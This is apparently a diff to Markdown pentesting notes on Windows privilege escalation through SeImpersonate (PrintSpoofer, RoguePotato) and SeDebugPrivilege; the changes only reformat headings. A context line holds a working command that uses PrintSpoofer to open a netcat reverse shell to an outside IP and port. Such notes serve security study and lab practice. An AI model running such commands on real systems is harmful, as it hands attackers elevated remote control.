@@ -10,6 +10,7 @@
   - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). work on Windows 10 and Server 2016/2019.
   - [RoguePotato](https://github.com/antonioCoco/RoguePotato). 
 
+### check 
 ```powershell
 whoami /priv
 
@@ -30,10 +31,10 @@ c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 ## SeDebugPrivilege
 - To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.
 - it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.
-- 
 
 
-**check**
+
+### check
 ```
 whoami /priv
 
